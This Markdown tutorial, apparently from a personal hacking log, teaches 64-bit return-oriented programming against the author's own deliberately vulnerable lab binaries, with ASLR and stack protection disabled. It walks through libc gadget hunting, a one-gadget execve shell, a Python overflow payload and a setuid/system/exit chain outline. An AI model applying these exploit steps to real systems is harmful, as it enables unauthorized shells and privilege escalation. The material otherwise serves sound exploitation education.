# 64 bit ROP

dependencies:
[Basics of ROP](first.md)

sources: \
https://en.wikipedia.org/wiki/X86-64#Virtual_address_space_details \
https://www.ret2rop.com/2018/08/return-to-libc.html \
https://en.wikipedia.org/wiki/X86_calling_conventions \
https://aaronbloomfield.github.io/pdr/book/x86-64bit-ccc-chapter.pdf \
https://reverseengineering.stackexchange.com/questions/1994/base-address-of-shared-objects-from-ldd-output \
https://reverseengineering.stackexchange.com/questions/3726/rop-exploitation-in-x86-64-linux \
https://security.stackexchange.com/questions/143719/corrupted-address-when-performing-64-bit-rop-chain \

After seeing how do on 32 bit archtecture, we are ready to move on to
64 bit ROP!

This section will prove to be more challeging, but also more rewarding,
since we are moving closer and closer to understand how these attacks
are normally performed in modern applications.

## Second Easiest Scenario

### The Compilation

For this section we will use the rule `second` in the `Makefile`. to use
just type `make second` or do it manually with:

```
gcc rip.c -fno-stack-protector -o rip
gcc rip_read.c -fno-stack-protector -o rip_read

```

Also, disable ASLR with:

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

## Major Differences

What do we need to watch out when doing a 64 bit ROP exploitation for the
first time?

### Addresses

In 64 bit the addresses are 64 bit wide, just like 32 bit architecture had
32 bit addresses. However, since 64 bit provide an enourmous number of
possible addresses, only 48 bytes are actually used (already enough to 
address 256 terabytes!).

That means only addresses from `0x0000 0000 0000 0000` to `0x0000 7fff ffff ffff`
are actually used, which force us to always deal with two null bytes everytime we
handle an address.

### Arguments

In 64 bits most arguments are passed through registers. We will need to somehow
load the desired arguments to a function to the right registers before calling
a function.

### Offset

Since we are not using the `-no-pie` option, our binary will contain function
independent code, which means `objdump` and other static analysis tools
won't be able to show us the exact addresses that will be used be the binary.

This is easy to overcome since we are still not using ASLR and we can just see
what addresses are used in GDB when the program is loaded.

## Plan of Attack

It is actually pretty straight forward to overwrite RIP
(not EIP anymore, remember that!) in 64 bit.

Since most systems use little-endian and usually the two MSB bytes are null
for every address, we can write the non-null part of the address to RIP.

However, this means that is really difficult to make a ROP chain, since
we would need to write two null bytes for every address we use. This means
we can't use `gets` like last time, since we would need to use `gets`
address and an address for it to nullify.

If instead of `scanf` or just a command line argument the input
function was `read`, we could write null bytes. `read` can read the
input as a file, that means that instead of reading the input as a
string, it reads it as a stream of bytes, no matter their value.

obs1.: I use `scanf` as an example here, any kind of function
that treats your input as a string should be affected the same way.

obs2.: I also use `read` as an example, any kind of function that
treats your input as a stream of bytes should be affected the same way.

That's why we have a division below: `scanf` (or command line argument)
exploits work also with `read`, but the `read` exploits only work with
`read`.

Below are some techniques to get a shell in `rip.c`, which use `scanf`
or command line arguments:

* [One Gadget to Rule Them All](#one-gadget-to-rule-them-all)

And these are the exploits to get a shell in `rip_read.c`, which use `read`:

* [ROP Chain 2: Eletric Boogaloo](#rop-chain-2-eletric-boogaloo)

Remember that the number of garbage bytes we will need to write to the
buffer to get to RIP may differ from 32 bit. You need to analyse the 64 bit
binary, just like we did in the
[buffer overflow](../buffer_overflow/buffer_overflow.md) section.

## One Gadget to Rule Them All

### The Gadgets

We can get a shell by calling `system("/bin/sh")` or `execve("/bin/sh", 0, 0)`.
At first it may look harder to call `execve` due to the two null arguments,
but since all we are going to do is look for a gadget to do it for us we don't
need to worry.

First, let's see how we would call these functions in assembly to know what
we are looking for.

We can get how `system` assembly looks by using `objdump` in our 64 bit
compiled `rip`:

`system("/bin/sh")`:

```
lea    rdi,[rip+0x13d]
call   640 <system@plt>
```

As you can see, it is really simple. The address of the string "bin/sh" is
loaded to `rdi` as an argument.

For `execve` we can just write a little program like:

```
#include<unistd.h>

int main(){

	execve("/bin/sh", 0, 0);
	return 0;
}
```

And analyse with `objdump`. We can see that the assembly for `main` looks
like this:

```
edx,0x0
esi,0x0
lea    rdi,[rip+0x9f]
call   560 <execve@plt>
```

Though only the lower 32 bits of `rdx` and `rsi` are set to 0, we can't
assure that will be enough for every case. The compiler could know that
they would have the other bits set to zero before, and thus optimized
the process.

What the arguments given by `rdx` and `rsi` do is set the arguments
and environments variables used by the command given by `rdi`.

Besides that, the rest of the code is really straight forward, the
address of "/bin/sh" is loaded to `rdi` as an argument.

All we need to do now is find an gadget like the ones above that would
give us a shell. We need to look for one of these in `libc`.

### Finding "/bin/sh" again

Using `ldd rip` we can see what objects are linked to the binary when
it launches:

```
linux-vdso.so.1 (0x00007ffff7ffa000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7838000)
/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd9000)
```

As you can see, `libc` is at `/lib/x86_64-linux-gnu/libc.so.6`. The
address next to it is the address loaded when `ldd` called for the
library. Even with no ASLR, this address may be different when we
run our binary, since it depends on the loading order of the libraries.

Now we need to find the address of "/bin/sh" in `libc`. We did it
before using the `find` command in `gdb`, but we can also do it only
using static analysis.

Constant strings like "/bin/sh" are kept in the `.rodata` section.
We can find the offset of `.rodata` with:

```
readelf --sections /lib/x86_64-linux-gnu/libc.so.6 | grep rodata

```

My output was:

```
[16] .rodata           PROGBITS         000000000014a660  0014a660
```

Remember, your addresses may differ.

The last column refers to the offset of the section in the file, and
the column on its left is the address it is loaded to. Since `libc`
is a shared object, it has position independent code, so no predetermined
address for it to be loaded to (Although without ASLR it will always
be loaded to the same address).

Now we can find the offset of "/bin/sh" from the beggining of the section
with:

```
readelf -p .rodata /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
```

Which for me yields:

```
[ 175b9]  /bin/sh
```

If we add `0x14a660` (`.rodata` offset within `libc`) with `0x175b9`
("/bin/sh" offset within `.rodata`) we get `0x161c19`
(offset of "/bin/sh" from the beggining of `libc`).

Obs.: We also could have gathered this result with `strings -t x
/lib/x86_64-linux-gnu/libc.so.6`.

If we added this result to the address `libc` will be loaded to
when linked (given by `ldd`) we could get which address "/bin/sh"
would be loaded to when the program is run.

However, within the `libc` code its elements are all referenced
using the offset, so we just need `0x161c19` to filter our
search for gadgets.

### Finding the Gadget

We need a gadget that calls `execve` and `system` using "/bin/sh".

We can use `grep` with `objdump` to filter our searches.

First, let's look for `system`:

```
objdump -D -M intel-mnemonic /lib/x86_64-linux-gnu/libc.so.6 | grep -B 5 "system" | grep -C 3 "161c19"
```

Besides dumping the `libc` code, this command uses `grep` to print
the 5 lines that come before `system`. The result of this search
is given to another `grep` call, that prints 3 lines before and
after the "/bin/sh" offset we found.

For my version of `libc`, nothing is found.

If we try with execve though:

```
objdump -D -M intel-mnemonic /lib/x86_64-linux-gnu/libc.so.6 | grep -B 5 "execve" | grep -C 3 "161c19"
```

I get:

```
--
b8c07:	48 89 ca             	mov    rdx,rcx
b8c0a:	e8 81 b2 fc ff       	call   83e90 <memcpy@GLIBC_2.2.5>
b8c0f:	48 8d 3d 03 90 0a 00 	lea    rdi,[rip+0xa9003]        # 161c19 <_libc_intl_domainname@@GLIBC_2.2.5+0x159>
b8c16:	4c 89 e2             	mov    rdx,r12
b8c19:	4c 89 ee             	mov    rsi,r13
b8c1c:	e8 1f fa ff ff       	call   b8640 <execve@@GLIBC_2.2.5>
--
d6b9a:	e8 81 53 00 00       	call   dbf20 <__close@@GLIBC_2.2.5>
d6b9f:	48 8b 05 12 23 2c 00 	mov    rax,QWORD PTR [rip+0x2c2312]        # 398eb8 <__environ@@GLIBC_2.2.5-0x3080>
d6ba6:	48 8d 74 24 60       	lea    rsi,[rsp+0x60]
d6bab:	48 8d 3d 67 b0 08 00 	lea    rdi,[rip+0x8b067]        # 161c19 <_libc_intl_domainname@@GLIBC_2.2.5+0x159>
d6bb2:	48 8b 10             	mov    rdx,QWORD PTR [rax]
d6bb5:	e8 86 1a fe ff       	call   b8640 <execve@@GLIBC_2.2.5>
```

Sucess! Now we just need to overwrite RIP with one of
the addresses.

But we only got the offsets. To get the proper addresses
we need to add the offset to the address `libc` will be
loaded to.

### Putting It All Together

We can get the address `libc` is loaded to by running with `gdb`,
breaking at some point and calling `info proc map`:

```
(gdb) info proc map
process 5827
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555555000     0x1000        0x0 /mnt/felipe/uff/inmetro/hacking_log/binary_exploitation/rop/rip
      0x555555754000     0x555555755000     0x1000        0x0 /mnt/felipe/uff/inmetro/hacking_log/binary_exploitation/rop/rip
      0x555555755000     0x555555756000     0x1000     0x1000 /mnt/felipe/uff/inmetro/hacking_log/binary_exploitation/rop/rip
      0x7ffff7a3a000     0x7ffff7bcf000   0x195000        0x0 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7bcf000     0x7ffff7dcf000   0x200000   0x195000 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7dcf000     0x7ffff7dd3000     0x4000   0x195000 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7dd3000     0x7ffff7dd5000     0x2000   0x199000 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7dd5000     0x7ffff7dd9000     0x4000        0x0 
      0x7ffff7dd9000     0x7ffff7dfc000    0x23000        0x0 /lib/x86_64-linux-gnu/ld-2.24.so
      0x7ffff7fd7000     0x7ffff7fd9000     0x2000        0x0 
      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vvar]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x23000 /lib/x86_64-linux-gnu/ld-2.24.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x24000 /lib/x86_64-linux-gnu/ld-2.24.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
```

As you can see, `libc` is loaded to `0x7ffff7a3a000`. Add
this to one of gadgets offset and we got our address! If we
try `0xd6b9f` from this snippet:

```
d6b9a:	e8 81 53 00 00       	call   dbf20 <__close@@GLIBC_2.2.5>
d6b9f:	48 8b 05 12 23 2c 00 	mov    rax,QWORD PTR [rip+0x2c2312]        # 398eb8 <__environ@@GLIBC_2.2.5-0x3080>
d6ba6:	48 8d 74 24 60       	lea    rsi,[rsp+0x60]
d6bab:	48 8d 3d 67 b0 08 00 	lea    rdi,[rip+0x8b067]        # 161c19 <_libc_intl_domainname@@GLIBC_2.2.5+0x159>
d6bb2:	48 8b 10             	mov    rdx,QWORD PTR [rax]
d6bb5:	e8 86 1a fe ff       	call   b8640 <execve@@GLIBC_2.2.5>
```

`0x7ffff7a3a000` + `0xd6b9f` = `0x7ffff7b10b9f`. With a simple
exploit like this:

```
import sys
import struct

payload = b'A' * 0x10
payload += b'BBBBBBBB'
payload += struct.pack("Q", 0x7ffff7b10b9a)

sys.stdout.buffer.write(payload)
```

We can run `./rip $( python3 second.py )` and get a shell!

Unfortunely, we can't call `setuid` to get a root
shell, but in some systems this can be enough to
get root too.

## ROP Chain 2: Eletric Boogaloo

For this exploit, we need a buffer overflow caused by a input
function that reads a number of bytes from `stdin`. This 
bytes should not be read as string (for more info check
[Plan of Attack](#plan-of-attack))

We'll be exploiting the `rip_read` binary. To generate it,
check the [compilation](#the-compilation) section.

The idea is to do a ROP chain just like we did
[in 32 bits](../first/first.md/#getting-r00t).

The differences from the 32 bits chain is that in 64 bits
the arguments are passed from registers, not the stack
and we won't need `gets` since we can write null bytes.

Just like before, the plan is to call `setuid` to get a
root shell if the binary can be run as root. After that
we call `system` to give us a shell using "/bin/sh" and
finally call `exit` to end the program gracefully.

Since the registers are used to pass arguments in 64 bits,
we need to somehow give value to a register before calling
a function.

If we use
`objdump -D -M intel rip_read | grep -A 7 impossible_shell`,
we can see how `system` is called by the function
`impossible_shell`:

```
0000000000000780 <impossible_shell>:
 780:	55                   	push   rbp
 781:	48 89 e5             	mov    rbp,rsp
 784:	48 8d 3d 2d 01 00 00 	lea    rdi,[rip+0x12d]        # 8b8 <_IO_stdin_used+0x8>
 78b:	e8 90 fe ff ff       	call   620 <system@plt>
 790:	90                   	nop
 791:	5d                   	pop    rbp
 792:	c3                   	ret  
```

As you can see, the argument is loaded to `rdi`. In linux
the first argument goes to `rdi`, the second to `rsi`
and the third to `rdx` (for more details check 
[here](../../assembly/stack.md/#caviats)).

Since we only control the values on the stack, a good
idea is to put the desired value for `rdi` in the stack
and `pop` it to `rdi`.

We can look for a gadget that can do it for us in `libc`.
With `ldd rip_read` we can get the `libc` path, and them
use
`objdump -D -M intel /lib/x86_64-linux-gnu/libc.so.6 | grep -B 1 ret | grep -A 1 "pop.*rdi"`:

```
  1729fd:	5f                   	pop    rdi
  1729fe:	c3                   	ret    
```

We can them catch a break in `rip_read` in `gdb` to see
where `libc` is loaded (with `info proc map`) and
them add it to the offset of `pop rdi`:

```
(gdb) info proc map
process 11292
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555555000     0x1000        0x0 /mnt/felipe/uff/inmetro/hacking_log/binary_exploitation/rop/second/rip_read
      0x555555754000     0x555555755000     0x1000        0x0 /mnt/felipe/uff/inmetro/hacking_log/binary_exploitation/rop/second/rip_read
      0x555555755000     0x555555756000     0x1000     0x1000 /mnt/felipe/uff/inmetro/hacking_log/binary_exploitation/rop/second/rip_read
      0x7ffff7a3a000     0x7ffff7bcf000   0x195000        0x0 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7bcf000     0x7ffff7dcf000   0x200000   0x195000 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7dcf000     0x7ffff7dd3000     0x4000   0x195000 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7dd3000     0x7ffff7dd5000     0x2000   0x199000 /lib/x86_64-linux-gnu/libc-2.24.so
      0x7ffff7dd5000     0x7ffff7dd9000     0x4000        0x0 
      0x7ffff7dd9000     0x7ffff7dfc000    0x23000        0x0 /lib/x86_64-linux-gnu/ld-2.24.so
      0x7ffff7fd7000     0x7ffff7fd9000     0x2000        0x0 
      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vvar]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x23000 /lib/x86_64-linux-gnu/ld-2.24.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x24000 /lib/x86_64-linux-gnu/ld-2.24.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
```

As we can see `/lib/x86_64-linux-gnu/libc-2.24.so` is
loaded to `0x7ffff7a3a000`. By adding it to `pop rdi`
offset (`1729fd`) we get `0x7ffff7bac9fd`.

Since we already got a break, we can also get the
addresses of the functions we'll be using:

```
(gdb) p setuid
$1 = {<text variable, no debug info>} 0x7ffff7af2fa0 <__setuid>
(gdb) p system
$2 = {<text variable, no debug info>} 0x7ffff7a79480 <__libc_system>
(gdb) p exit
$3 = {<text variable, no debug info>} 0x7ffff7a6f980 <__GI_exit>
```

All that is left is to find the address of "/bin/sh":

```
(gdb) find 0x7ffff7a3a000, 0x7ffff7dd5000, "/bin/sh"
0x7ffff7b9bc19
```

Now we got all the building blocks! Time to put it
all together.

Since we need to `pop rdi` before
making a function call, let's return to `pop rdi`
and put the `rdi` value right after it:

```
pop rdi + 0 + setuid + address of "/bin/sh" + system + exit
```

You can see it coded at `second_read.py`:

```

```
